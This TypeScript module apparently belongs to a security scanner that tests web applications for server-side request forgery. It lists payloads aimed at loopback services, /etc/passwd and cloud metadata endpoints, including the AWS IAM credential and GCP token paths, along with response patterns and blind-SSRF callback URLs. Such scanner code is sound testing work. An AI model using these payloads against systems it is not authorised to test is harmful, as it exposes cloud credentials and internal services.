import { randomUUID } from 'node:crypto';

export const SSRF_PAYLOADS = [
  'http://127.0.0.1',
  'http://localhost',
  'http://[::1]',
  'http://0.0.0.0',
  'http://169.254.169.254/latest/meta-data/',   // AWS metadata
  'http://metadata.google.internal/',            // GCP metadata
  'http://100.100.100.200/latest/meta-data/',    // Alibaba metadata
  'file:///etc/passwd',
  'http://127.0.0.1:22',                        // port scan
  'http://127.0.0.1:3000',                      // internal services
];

export const SSRF_PARAM_PATTERNS = /[?&](url|link|src|image|proxy|callback|fetch|load|uri|href|path|file|resource|target|site|page|data)=/i;

export const SSRF_INDICATORS = [
  /root:.*:0:0/,                  // /etc/passwd content
  /ami-id/i,                      // AWS metadata
  /instance-id/i,                 // Cloud metadata
  /meta-data/i,                   // Generic metadata
  /Connection refused/i,          // Internal port scan evidence
  /ECONNREFUSED/,                 // Node.js connection refused
  /No route to host/i,
  /EHOSTUNREACH/,                 // Node.js host unreachable
  /Could not fetch.*127\.0\.0\.1/i,  // Server-side fetch error for loopback
  /Could not fetch.*localhost/i,     // Server-side fetch error for localhost
  /Could not fetch.*\[::1\]/i,      // Server-side fetch error for IPv6 loopback
];

/**
 * Generate callback-based SSRF payloads for blind SSRF detection.
 * Each payload gets a unique ID so the user can correlate hits on their
 * callback server (Burp Collaborator, interactsh, etc.) with injected payloads.
 */
export function generateCallbackPayloads(callbackUrl: string): string[] {
  // Normalize: strip trailing slash
  const base = callbackUrl.replace(/\/+$/, '');

  return [
    // Plain callback URL with unique path
    `${base}/ssrf-${randomUUID()}`,
    // Callback with a nested path to test path handling
    `${base}/ssrf-${randomUUID()}/probe`,
    // URL-encoded variant
    encodeURI(`${base}/ssrf-${randomUUID()}`),
    // With explicit port 80 (tests port normalization bypass)
    `${base}:80/ssrf-${randomUUID()}`,
    // With explicit port 443
    `${base}:443/ssrf-${randomUUID()}`,
  ];
}

/**
 * Get all SSRF payloads, optionally including callback-based payloads
 * for blind SSRF detection.
 */
export function getSSRFPayloads(callbackUrl?: string): string[] {
  if (!callbackUrl) {
    return [...SSRF_PAYLOADS];
  }
  return [...SSRF_PAYLOADS, ...generateCallbackPayloads(callbackUrl)];
}

/** Cloud metadata payloads — these target cloud provider metadata services.
 *  Each has a specific response pattern to confirm real access. */
export const CLOUD_METADATA_PROBES: Array<{ url: string; indicator: RegExp; cloud: string; severity: 'critical' }> = [
  // AWS IMDSv1 (no token required)
  { url: 'http://169.254.169.254/latest/meta-data/', indicator: /ami-id|instance-id|local-ipv4|hostname/i, cloud: 'AWS', severity: 'critical' },
  { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', indicator: /AccessKeyId|SecretAccessKey|Token|Expiration|arn:aws:iam/i, cloud: 'AWS IAM Role', severity: 'critical' },
  { url: 'http://169.254.169.254/latest/dynamic/instance-identity/document', indicator: /"instanceId"|"region"|"accountId"/i, cloud: 'AWS', severity: 'critical' },

  // GCP metadata
  { url: 'http://metadata.google.internal/computeMetadata/v1/', indicator: /instance\/|project\//i, cloud: 'GCP', severity: 'critical' },
  { url: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', indicator: /access_token/i, cloud: 'GCP Token', severity: 'critical' },

  // Azure IMDS
  { url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', indicator: /"compute"|"network"/i, cloud: 'Azure', severity: 'critical' },

  // DigitalOcean
  { url: 'http://169.254.169.254/metadata/v1/', indicator: /droplet_id|hostname|region/i, cloud: 'DigitalOcean', severity: 'critical' },

  // Alibaba Cloud
  { url: 'http://100.100.100.200/latest/meta-data/', indicator: /instance-id|hostname/i, cloud: 'Alibaba', severity: 'critical' },
];
